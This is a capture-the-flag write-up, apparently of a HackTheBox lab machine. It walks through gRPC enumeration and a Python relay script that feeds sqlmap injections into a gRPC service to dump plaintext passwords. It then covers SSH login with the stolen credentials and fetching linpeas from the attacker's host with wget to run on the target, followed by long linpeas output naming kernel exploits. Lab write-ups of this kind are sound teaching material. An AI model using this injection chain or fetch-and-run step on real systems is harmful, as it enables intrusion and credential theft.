# Enumeration

I ran the following scans against 10.1.0.1...

```
autorecon --single-target -v -o pc 10.10.11.214
```

findings 
- ssh on port 22 
- unknown service on port 50051

then I ran
```
nc 10.10.11.214 50051 
```

findings
- this gave me encrypted or encoded output 
- after some further recon I found the tool grp curl which i installed with 
```
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
```

enumeration with grpcurl 
```
grpcurl -plaintext 10.10.11.214:50051 list
```
- got the following output 
	```
	SimpleApp
	grpc.reflection.v1alpha.ServerReflection
	```
- then i ran 
	```
	grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
	```
- got the following output 
	```
	SimpleApp.LoginUser
	SimpleApp.RegisterUser
	SimpleApp.getInfo
	```
- then I ran 
```
grpcurl -plaintext -d '{"username":"admin", "password":"admin"}' 10.10.11.214:50051 SimpleApp.RegisterUser
```
- output reflected that the user account already existed 
- then I ran 
```
grpcurl -plaintext -d '{"username":"admin", "password":"admin"}' 10.10.11.214:50051 SimpleApp.LoginUser
```
- output reflected my id was 296 
- then I ran 
```
grpcurl -plaintext -v -d '{"username":"admin", "password":"admin"}' 10.10.11.214:50051 SimpleApp.LoginUser
```
- output was as follows 
```
Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "Your id is 757."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTk3Mzc5NDB9.3fW94kyNaxzLHBiSNd0Bauplm4UuCYJV6jT9Hzj37wE'
Sent 1 request and received 1 response

```
- then I ran with the token in the header to see what I could get 
```
./go/bin/grpcurl -plaintext -v -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTk3Mzc5NDB9.3fW94kyNaxzLHBiSNd0Bauplm4UuCYJV6jT9Hzj37wE' -d '{"id":"true"}' 10.10.11.214:50051 SimpleApp.getInfo
```
- got the following output 
```
Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTk3Mzc5NDB9.3fW94kyNaxzLHBiSNd0Bauplm4UuCYJV6jT9Hzj37wE

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "The admin is working hard to fix the issues."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response

```
- then i ran 
```
./go/bin/grpcurl -plaintext -v -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTk3Mzc5NDB9.3fW94kyNaxzLHBiSNd0Bauplm4UuCYJV6jT9Hzj37wE' -d '{"id":"757"}' 10.10.11.214:50051 SimpleApp.getInfo
```
- got the following output 
```
Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTk3Mzc5NDB9.3fW94kyNaxzLHBiSNd0Bauplm4UuCYJV6jT9Hzj37wE

Response headers received:
(empty)

Response trailers received:
content-type: application/grpc
Sent 1 request and received 0 responses
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable

```
- this appears to be vulnerable to sqli because of the output above about the admin 
- to make the exploitation less tedious I used the following python script I found online and modified the token and ip address of the target machine which would be run concurrently with sqlmap 
```
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
import subprocess
import json

def send_grpc(payload):
        clean_payload = '{"id":"%s"}' % unquote(payload).replace('"','\'')

        cmd = [
                "grpcurl",
                "-plaintext",
                "-H", "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTk3MzY3MTV9.wZyzFKU5dLP3yd0Vbsx8hvfPbFkoXJcoWa2tTcdfK68",
                "-d", clean_payload,
                "10.10.11.214:50051",
                "SimpleApp.getInfo"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        resp = result.stdout

        # Process the response
        # parsed_response = json.loads(response)
        if resp:
                return resp
        else:
                return ''

def middleware_server(host_port,content_type="text/plain"):

        class CustomHandler(SimpleHTTPRequestHandler):
                def do_GET(self) -> None:
                        self.send_response(200)
                        try:
                                payload = urlparse(self.path).query.split('=',1)[1]
                        except IndexError:
                                payload = False

                        if payload:
                                content = send_grpc(payload)
                        else:
                                content = 'No parameters specified!'

                        self.send_header("Content-type", content_type)
                        self.end_headers()
                        self.wfile.write(content.encode())
                        return

        class _TCPServer(TCPServer):
                allow_reuse_address = True

        httpd = _TCPServer(host_port, CustomHandler)
        httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
        middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
        pass

```
- after executing this script i ran the following command for sqlmap
```
sqlmap -u "http://localhost:8081/?id=1" --level=5 --risk=3 -T accounts --dump
```
- got the following outputHereIsYourPassWord1431
```
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

```
- then I tried ssh login with sau 
```
ssh sau@10.10.11.214
```
- got a shell 
![[Pasted image 20231111135704.png]]
- got user.txt 
![[Pasted image 20231111135732.png]]
- put linpeas.sh in my /var/www/html dir and started the apache2 service on my attacker machine with 
```
sudo service apache2 start 
```
- then to get the file from the victim machine i ran 
```
wget http://10.10.14.20/linpeas.sh
```
- then I had to make the file executable before running it with 
```
chmod +x linpeas.sh 
```

- output of linpeas.sh
```

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                         
    |---------------------------------------------------------------------------------|                                                                         
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                         
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                         
    |         Respect on HTB            :     SirBroccoli                             |                                                                         
    |---------------------------------------------------------------------------------|                                                                         
    |                                 Thank you!                                      |                                                                         
    \---------------------------------------------------------------------------------/                                                                         
          linpeas-ng by carlospolop                                                                                                                             
                                                                                                                                                                
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                      
                                                                                                                                                                
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                        
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                             
                               ╚═══════════════════╝                                                                                                            
OS: Linux version 5.4.0-148-generic (buildd@lcy02-amd64-112) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023
User & Groups: uid=1001(sau) gid=1001(sau) groups=1001(sau)
Hostname: pc
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                                         
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                              
                                                                                                                                                                
                                                                                                                                                                

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                                
                              ╔════════════════════╗                                                                                                            
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                              
                              ╚════════════════════╝                                                                                                            
╔══════════╣ Operative system                                                                                                                                   
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                              
Linux version 5.4.0-148-generic (buildd@lcy02-amd64-112) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023       
Distributor ID: Ubuntu                                                                                                                                          
Description:    Ubuntu 20.04.6 LTS                                                                                                                              
Release:        20.04                                                                                                                                           
Codename:       focal                                                                                                                                           
                                                                                                                                                                
╔══════════╣ Sudo version                                                                                                                                       
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                 
Sudo version 1.8.31                                                                                                                                             
                                                                                                                                                                
                                                                                                                                                                
╔══════════╣ PATH                                                                                                                                               
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                         
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                              
                                                                                                                                                                
╔══════════╣ Date & uptime
Sat Nov 11 19:02:03 UTC 2023                                                                                                                                    
 19:02:03 up  1:18,  1 user,  load average: 0.20, 0.05, 0.02

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                            
sda
sda1
sda2
sda3

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                       
LABEL=cloudimg-rootfs   /        ext4   defaults        0 1                                                                                                     
data /data vboxsf uid=1000,gid=1000,_netdev 0 0
vagrant /vagrant vboxsf uid=1000,gid=1000,_netdev 0 0
/dev/sda3 none swap sw 0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                         
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                                 
HISTFILESIZE=0
USER=sau
SSH_CLIENT=10.10.14.20 44772 22
XDG_SESSION_TYPE=tty
SHLVL=1
MOTD_SHOWN=pam
HOME=/home/sau
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
LOGNAME=sau
_=./linpeas.sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=10
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1001
LANG=C.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/sau
SSH_CONNECTION=10.10.14.20 44772 10.10.11.214 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                          
dmesg Not Found                                                                                                                                                 
                                                                                                                                                                
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                              
[+] [CVE-2022-2586] nft_object UAF                                                                                                                              

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                         
                                                                                                                                                                
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                   
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                        
═╣ PaX bins present? .............. PaX Not Found                                                                                                               
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                        
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                          
═╣ Seccomp enabled? ............... disabled                                                                                                                    
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                      HereIsYourPassWord1431                                          

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                             
                                   ╚═══════════╝                                                                                                                
╔══════════╣ Container related tools present (if any):
/snap/bin/lxc                                                                                                                                                   
╔══════════╣ Am I Containered?
╔══════════╣ Container details                                                                                                                                  
═╣ Is this a container? ........... No                                                                                                                          
═╣ Any running containers? ........ No                                                                                                                          
                                                                                                                                                                

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                             
                                     ╚═══════╝                                                                                                                  
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                              
                ╚════════════════════════════════════════════════╝                                                                                              
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                     
root         486  0.0  0.0   2488   580 ?        S    17:43   0:00  _ bpfilter_umh                                                                              
root           1  0.0  0.2 102612 11532 ?        Ss   17:43   0:02 /sbin/init
root         463  0.0  1.2 117628 49328 ?        S<s  17:43   0:03 /lib/systemd/systemd-journald
root         506  0.0  0.1  20576  6196 ?        Ss   17:43   0:01 /lib/systemd/systemd-udevd
systemd+     524  0.0  0.1  19080  7528 ?        Ss   17:43   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
root         680  0.0  0.4 280136 17948 ?        SLsl 17:43   0:00 /sbin/multipathd -d -s
root         711  0.0  0.0  11356  1616 ?        S<sl 17:43   0:00 /sbin/auditd
root         731  0.0  0.2  49296 10608 ?        Ss   17:43   0:00 /usr/bin/VGAuthService
root         733  0.1  0.2 313228  8644 ?        Ssl  17:43   0:06 /usr/bin/vmtoolsd
root         760  0.0  0.1  99900  5748 ?        Ssl  17:43   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         831  0.0  0.2 241052  9256 ?        Ssl  17:43   0:00 /usr/lib/accountsservice/accounts-daemon[0m
message+     833  0.0  0.1   7576  4708 ?        Ss   17:43   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         839  0.0  0.0  81956  3572 ?        Ssl  17:43   0:00 /usr/sbin/irqbalance --foreground
root         840  0.0  0.4  29876 18224 ?        Ss   17:43   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         841  0.0  0.2 236440  9092 ?        Ssl  17:43   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       842  0.0  0.1 224344  5676 ?        Ssl  17:43   0:01 /usr/sbin/rsyslogd -n -iNONE
root         844  0.0  1.0 875264 43076 ?        Ssl  17:43   0:01 /usr/lib/snapd/snapd
root         845  0.0  0.1  17360  7640 ?        Ss   17:43   0:00 /lib/systemd/systemd-logind
root         846  0.0  0.3 395492 13520 ?        Ssl  17:43   0:00 /usr/lib/udisks2/udisksd
root         878  0.0  0.3 318820 13256 ?        Ssl  17:43   0:00 /usr/sbin/ModemManager
systemd+    1007  0.0  0.3  24448 12336 ?        Ss   17:43   0:00 /lib/systemd/systemd-resolved
root        1043  0.8  0.7 634536 31084 ?        Ssl  17:43   0:41 /usr/bin/python3 /opt/app/app.py
root        1048  0.0  1.4 1215780 58424 ?       Ssl  17:43   0:04 /usr/bin/python3 /usr/local/bin/pyload
root        1067  0.0  0.0   8540  3024 ?        Ss   17:43   0:00 /usr/sbin/cron -f
sau         1700  0.0  0.1  13928  5924 ?        S    18:50   0:00      _ sshd: sau@pts/0
sau         1701  0.0  0.1  10120  5196 pts/0    Ss   18:50   0:00          _ -bash
sau         1735  0.2  0.0   3532  2576 pts/0    S+   19:01   0:00              _ /bin/sh ./linpeas.sh
sau         4963  0.0  0.0   3532  1020 pts/0    S+   19:02   0:00                  _ /bin/sh ./linpeas.sh
sau         4967  0.0  0.0  10952  3668 pts/0    R+   19:02   0:00                  |   _ ps fauxwww
sau         4966  0.0  0.0   3532  1020 pts/0    S+   19:02   0:00                  _ /bin/sh ./linpeas.sh
daemon[0m      1072  0.0  0.0   3796  2272 ?        Ss   17:43   0:00 /usr/sbin/atd -f
root        1079  0.0  0.0   5828  1876 tty1     Ss+  17:43   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
sau         1595  0.0  0.2  19104  9700 ?        Ss   18:50   0:00 /lib/systemd/systemd --user
sau         1596  0.0  0.0 103840  3352 ?        S    18:50   0:00  _ (sd-pam)
sau         4853  0.0  0.0   7108  3984 ?        Ss   19:02   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                    
                                                                                                                                                                
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                       
Proc 524 with ppid 1 is run by user systemd-network but the ppid user is root                                                                                   
Proc 833 with ppid 1 is run by user messagebus but the ppid user is root
Proc 842 with ppid 1 is run by user syslog but the ppid user is root
Proc 1007 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 1072 with ppid 1 is run by user daemon but the ppid user is root
Proc 1595 with ppid 1 is run by user sau but the ppid user is root
Proc 1700 with ppid 1572 is run by user sau but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                              
COMMAND    PID  TID TASKCMD              USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                                                        

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                              
gdm-password Not Found                                                                                                                                          
gnome-keyring-daemon Not Found                                                                                                                                  
lightdm Not Found                                                                                                                                               
vsftpd Not Found                                                                                                                                                
apache2 Not Found                                                                                                                                               
sshd: process found (dump creds from memory as root)                                                                                                            

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                          
/usr/bin/crontab                                                                                                                                                
incrontab Not Found
-rw-r--r-- 1 root root    1042 Jan 11  2023 /etc/crontab                                                                                                        

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jan 10  2023 .
drwxr-xr-x 98 root root 4096 May 15 09:06 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--  1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--  1 root root  191 Jan 10  2023 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Apr 27  2023 .
drwxr-xr-x 98 root root 4096 May 15 09:06 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  376 Sep 16  2021 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Apr 25  2022 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jan 10  2023 .
drwxr-xr-x 98 root root 4096 May 15 09:06 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jan 10  2023 .
drwxr-xr-x 98 root root 4096 May 15 09:06 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Apr 27  2023 .
drwxr-xr-x 98 root root 4096 May 15 09:06 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  813 Feb 25  2020 man-db
-rwxr-xr-x  1 root root  403 Apr 25  2022 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                     

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                     
/etc/systemd/system/multi-user.target.wants/atd.service could be executing some relative path                                                                   
/etc/systemd/system/multi-user.target.wants/grub-common.service could be executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service could be executing some relative path
You can't write on systemd PATH

